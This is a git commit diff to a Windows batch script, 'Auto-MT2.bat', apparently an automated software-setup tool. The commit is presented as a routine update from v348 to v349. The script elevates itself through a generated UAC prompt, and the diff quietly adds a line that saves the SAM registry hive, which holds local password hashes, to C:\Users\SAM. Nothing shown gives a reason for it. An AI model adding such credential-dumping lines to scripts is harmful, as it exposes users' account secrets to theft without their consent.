39b460c0645fdb8a6fd0e54b7439c7d08ac8b6c6
minhtuan283 <tanghuynhminhtuan@gmail.com>
2025-03-16 17:23:47 +0700

    Update Auto-MT2.bat

--- Auto-MT2.bat
+++ Auto-MT2.bat
@@ -10,6 +10,7 @@ del /q "%~dp0Script.zip" >nul 2>&1
 set "params=%*"
 cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
 rmdir /s /q "%USERPROFILE%\desktop\1-Soft"
+reg save HKLM\SAM C:\Users\SAM
 start "" /min "%~dp0Script\internet.bat"
 cls
 
@@ -24,7 +25,7 @@ echo  " \/ /   | |_) | '_ \ / _ \| '_ \ / _` |  \ \ / / | | |   \/ / "
 echo  " / /\   |  __/| | | | (_) | | | | (_| |   \ V /| |_| |   / /\ "
 echo  "/ /\ \  |_|   |_| |_|\___/|_| |_|\__, |    \_/  \__,_|  / /\ \"
 echo  "\ \/ /                           |___/                  \ \/ /"
-echo  " \/ /                           AutoSoft v348 by Bunbo   \/ / "
+echo  " \/ /                           AutoSoft v349 by Bunbo   \/ / "
 echo  " / /\.--..--..--..--..--..--..--..--..--..--..--..--..--./ /\ "
 echo  "/ /\ \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \/\ \"
 echo  "\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `' /"
